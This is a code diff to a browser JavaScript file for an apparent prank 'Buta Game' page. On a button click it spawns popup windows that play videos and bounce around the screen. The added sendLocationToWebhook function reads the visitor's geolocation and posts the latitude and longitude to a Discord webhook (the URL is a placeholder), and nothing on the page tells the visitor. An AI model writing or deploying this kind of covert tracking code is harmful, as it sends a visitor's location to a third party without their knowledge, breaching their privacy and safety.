@@ -5,45 +5,69 @@ document.getElementById('playButton').addEventListener('click', function() {
         'videos/video3.mp4'
     ];
 
-    // Open 3 tabs
-    const windows = videoFiles.map((url, index) => {
-        const newWindow = window.open('', '_blank', 'width=400,height=300');
-        newWindow.document.write(`
-            <video controls autoplay style="max-width: 100%;">
-                <source src="${url}" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-        `);
-        newWindow.document.close();
-        return newWindow;
-    });
+    // Open 3 moving tabs
+    videoFiles.forEach((url, index) => {
+        const newWindow = window.open('', 'Buta Game', 'width=400,height=300');
+        if (newWindow) {
+            newWindow.document.write(`
+                <title>Buta Game</title>
+                <video style="max-width: 100%;" muted autoplay>
+                    <source src="${url}" type="video/mp4">
+                </video>
+            `);
+            newWindow.document.close();
 
-    // Keep the first window open, minimize and move the other two
-    windows.forEach((win, index) => {
-        if (index === 0) return; // First tab stays open and normal
+            // Move the window
+            let x = Math.random() * (screen.width - 400);
+            let y = Math.random() * (screen.height - 300);
+            let dx = 2 + Math.random() * 2;
+            let dy = 2 + Math.random() * 2;
 
-        // Minimize the window (works in some browsers)
-        win.blur();
-        win.window.minimize?.(); // Not all browsers support minimize programmatically
-
-        // Move the window around
-        let x = Math.random() * (screen.width - 400);
-        let y = Math.random() * (screen.height - 300);
-        let dx = 2 + Math.random() * 2; // Random speed
-        let dy = 2 + Math.random() * 2;
-
-        function moveWindow() {
-            x += dx;
-            y += dy;
-            if (x < 0 || x > screen.width - 400) dx = -dx;
-            if (y < 0 || y > screen.height - 300) dy = -dy;
-            win.moveTo(x, y);
-            if (win.closed) return;
-            requestAnimationFrame(moveWindow);
+            function moveWindow() {
+                x += dx;
+                y += dy;
+                if (x < 0 || x > screen.width - 400) dx = -dx;
+                if (y < 0 || y > screen.height - 300) dy = -dy;
+                newWindow.moveTo(x, y);
+                if (newWindow.closed) return;
+                requestAnimationFrame(moveWindow);
+            }
+            moveWindow();
         }
-        moveWindow();
     });
 
-    // Hide the button after clicking
+    // Play fourth video on main page
+    const mainVideo = document.getElementById('mainVideo');
+    mainVideo.style.display = 'block';
+    mainVideo.play();
+
+    // Hide button
     this.style.display = 'none';
+
+    // Send location to Discord webhook
+    sendLocationToWebhook();
 });
+
+// Function to send location to Discord webhook
+function sendLocationToWebhook() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            const { latitude, longitude } = position.coords;
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your webhook URL
+            const data = {
+                content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
+                username: 'ButaGameBot'
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(error => console.error('Webhook error:', error));
+        }, error => {
+            console.error('Geolocation error:', error);
+        });
+    } else {
+        console.log('Geolocation not supported');
+    }
+}
